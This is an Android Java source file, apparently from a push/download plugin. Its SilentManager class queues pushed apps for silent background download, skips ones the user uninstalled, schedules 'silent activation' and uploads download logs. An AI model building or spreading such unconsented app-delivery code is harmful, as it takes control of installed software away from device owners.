package com.tiho.dlplugin.task.silent;

import android.content.Context;
import android.os.Handler;
import android.os.HandlerThread;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushLinkBean;
import com.tiho.dlplugin.bean.PushSilentBean;
import com.tiho.dlplugin.bean.Resource;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.ScheduleActivationDAO;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.scheduleact.ScheduleActList;
import com.tiho.dlplugin.task.uninstall.UnInstallList;
import com.tiho.dlplugin.util.PackageUtil;
import com.tiho.dlplugin.util.StringUtils;
import com.tiho.dlplugin.util.TimeUtil;

import java.util.LinkedList;
import java.util.List;

public class SilentManager {

    private static final int FROM_SILENT = 2;
    private static final int FROM_LINK = 3;
    private static SilentManager instance;
    private Context context;
    private SilentList silentList;
    private ScheduleActivationDAO scheduleActDao;
    private Handler handler;
    private HandlerThread silentPT;

    private SilentManager(Context context) {
        super();
        this.context = context;
        scheduleActDao = DAOFactory.getScheduleActSilentDAO(context);

        silentList = SilentList.getInstance(context);

        silentPT = new HandlerThread("silentPT");
        silentPT.start();
        handler = new Handler(silentPT.getLooper());//创建一个跟HandlerThread的Looper相关联的handler对象
        handler.post(SilentDownloader.getInstance(context, silentList, handler));//handler由于在HandlerThread线程创建，所以SilentDownloader中的run()方法也在该线程运行
    }

    public static synchronized SilentManager getInstance(Context c) {
        if (instance == null) {
            instance = new SilentManager(c);
        }

        return instance;
    }

    public void addPushSilentList(List<Resource> list) {
        if (list != null) {

            List<Resource> silences = new LinkedList<Resource>();

            for (Resource ps : list) {//筛选静默push消息，忽略在"unst.dat"列表中的，或者已安装并且是最新版本的消息
                if (ps instanceof PushSilentBean) {
                    silences.addAll(querySilences(ps, FROM_SILENT));//应用从没有被安装过，或者应用已安装但不是最新版本，就添加到silences中
                } else if (ps instanceof PushLinkBean) {
                    silences.addAll(querySilences(ps, FROM_LINK));//应用不在卸载列表就添加到silences中
                } else {
                    LogManager.LogShow("Resource 来源出错 ");
                }
            }

            silentList.addSilent(silences);

            // 重置定时激活列表,删除数据库中今天之前的数据,并把今天的要激活的取出来
            ScheduleActList.getInstance(context).reset();

            try {//存到文件silence.dat中
                DAOFactory.getIndepentSilnetDAO(context).savePushMessage(silences);
            } catch (Exception e) {
                LogManager.LogShow(e);
                e.printStackTrace();
            }
        }
    }

    private List<Resource> querySilences(Resource ps, int from) {

        String pack = StringUtils.isEmpty(ps.getResourceName()) ? ps.getResourceUrl() : ps.getResourceName();

        List<Resource> silences = new LinkedList<Resource>();
        if (from == FROM_SILENT) {
            PushSilentBean pushSilentBean = (PushSilentBean) ps;
            if (UnInstallList.deleted(context, ps.getResourceName())) {//该应用在"unst.dat"列表中，即该应用已经被卸载
                LogManager.LogShow(ps.getResourceName() + "已经被卸载，不进行静默下载" + "来源 " + from);

                LogUploadManager.getInstance(context).addSilentDownloadLog(from, pack, TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 0, "ALREADY_UNINSTALLED", 2, "Y");
                //该应用已经安装并且是最新版本
            } else if (PackageUtil.isInstalled(ps.getResourceName(), context) && PackageUtil.isLatestVersion(pushSilentBean.getMd5(), ps.getResourceName(), context)) {
                LogUploadManager.getInstance(context).addSilentDownloadLog(from, pack, TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 0, "DOWNLOAD_FAILED_ALREADY_INSTALLED", 2, "Y");
                if (!StringUtils.isEmpty(ps.getResourceTimeract()))
                    // 如果已经安装就更新数据库中定时静默激活列表"schedule_act_silent"的激活时间
                    scheduleActDao.saveScheduleList(ps.getResourceId(), ps.getResourceName(), ps.getResourceTimeract().trim(), true);

            } else {//应用从没有被安装过，或者应用已安装但不是最新版本，就添加到silences中
                silences.add(ps);
            }
        } else if (from == FROM_LINK) {
            if (UnInstallList.deleted(context, ps.getResourceName())) {
                LogManager.LogShow(ps.getResourceName() + "已经被卸载，不进行静默下载" + "来源 " + from);
                LogUploadManager.getInstance(context).addSilentDownloadLog(from, pack, TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 0, "ALREADY_UNINSTALLED", 2, "Y");
            } else {//应用不在卸载列表就添加到silences中
                silences.add(ps);
            }
        }
        return silences;

    }
}
